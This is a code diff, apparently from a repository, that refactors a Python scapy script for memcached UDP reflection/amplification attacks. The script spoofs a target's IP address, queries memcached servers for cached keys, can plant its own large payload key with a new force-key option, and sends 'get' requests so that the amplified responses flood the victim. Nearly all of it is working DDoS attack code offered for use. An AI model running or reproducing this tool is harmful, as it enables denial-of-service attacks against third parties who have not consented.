@@ -31,7 +31,7 @@ from scapy.layers.inet import IP, UDP
 
 from scapy.all import sr1
 
-PACKET_BASE = '\x00\x00\x00\x00\x00\x01\x00\x00{0}\r\n'
+packet_base = '\x00\x00\x00\x00\x00\x01\x00\x00{0}\r\n'
 
 def get_keys_by_id(server, target):
     """Function to retrieve all keys for
@@ -39,7 +39,7 @@ def get_keys_by_id(server, target):
     try:
         ip_packet = IP(src=target, dst=server)
         # fetch known keys by id
-        statitems_packet = PACKET_BASE.format('stats items')
+        statitems_packet = packet_base.format('stats items')
         udp = UDP(sport=50000, dport=11211)/statitems_packet
         keyids = []
         resp = sr1(ip_packet/udp)
@@ -48,6 +48,7 @@ def get_keys_by_id(server, target):
             if 'age' in key:
                 key = key.split(':')[1]
                 keyids.append(key)
+            continue
         return keyids
     except Exception as error:
         print str(error)
@@ -57,9 +58,10 @@ def get_key_name_by_id(server, target, kid):
     """Function to get key names by their id"""
     try:
         ip_packet = IP(src=target, dst=server)
-        keyid_packet = PACKET_BASE.format('stats cachedump {0} 100'.format(kid))
-        udp = UDP(sport=5000, dport=11211)/keyid_packet
+        keyid_packet = packet_base.format('stats cachedump {0} 100'.format(kid))
+        udp = UDP(sport=50000, dport=11211)/keyid_packet
         resp = str(sr1(ip_packet/udp).payload).split('\r\n')
+        keyname = None
         for key in resp:
             if 'ITEM' in key:
                 res = re.match(r"(.*)ITEM (?P<keyname>\w+)(.*)", key)
@@ -72,8 +74,8 @@ def set_memcached_payload(server, key, value):
     """Function to optionally set data into an
     entry in memcached for payload usage"""
     try:
-        mc = memcached.Client([server], debug=False)
-        mc.set(key, value)
+        mc_client = memcached.Client([server], debug=False)
+        mc_client.set(key, value)
         return True
     except Exception as error:
         print str(error)
@@ -83,15 +85,15 @@ def fun_packet(server, target, key):
     """The actual sauce"""
     try:
         ip_packet = IP(src=target, dst=server)
-        pkt = PACKET_BASE.format('get {0}'.format(key))
-        udp = UDP(sport=5000, dport=11211)/pkt
+        pkt = packet_base.format('get {0}'.format(key))
+        udp = UDP(sport=50000, dport=11211)/pkt
         sr1(ip_packet/udp)
         return True
     except Exception as error:
         print str(error)
         raise EnvironmentError('Could not send the payload packet')
 
-def work_magic(server, target):
+def work_magic(server, target, force_key=False):
     """Function to perform payload 'offload'
     from vulnerable memcached server"""
 
@@ -100,8 +102,6 @@ def work_magic(server, target):
     payload_key = 'fuckit'
 
     try:
-        ip_packet = IP(src=target, dst=server)
-
         # fetch known keys by id
         keyids = get_keys_by_id(server, target)
 
@@ -116,6 +116,11 @@ def work_magic(server, target):
                 keys.append(payload_key)
             else:
                 raise ValueError('Could not find any keys to use')
+
+        # If we want to force our own entries, doit
+        if force_key:
+            if set_memcached_payload(server, payload_key, payload):
+                raise Exception('Could not manually set payload')
 
         # iterate thru known keys and blast away
         for key in keys:
@@ -133,10 +138,12 @@ def main():
     server_help = 'List of servers to utilize (space separated)'
     list_help = 'File path to list of servers (newline separated)'
     target_help = 'Target to test'
+    force_key_help = 'Force manual key creation on remote memcached server(s)'
 
     parser.add_argument('-s', '--servers', nargs="+", help=server_help)
     parser.add_argument('-l', '--list', help=list_help)
     parser.add_argument('-t', '--target', required=True, help=target_help)
+    parser.add_argument('-f', '--force-key', action='store_true', help=force_key_help)
     args = parser.parse_args()
 
     if not args.servers and not args.list:
@@ -158,10 +165,12 @@ def main():
 
     try:
         for server in server_list:
-            work_magic(server, args.target)
-    except Exception as err:
-        print str(err)
+            work_magic(server, args.target, force_key=args.force_key)
+    except (ValueError, EnvironmentError, IndexError) as error:
+        print str(error)
         sys.exit(1)
+    except:
+        raise
 
 if __name__ == '__main__':
     main()
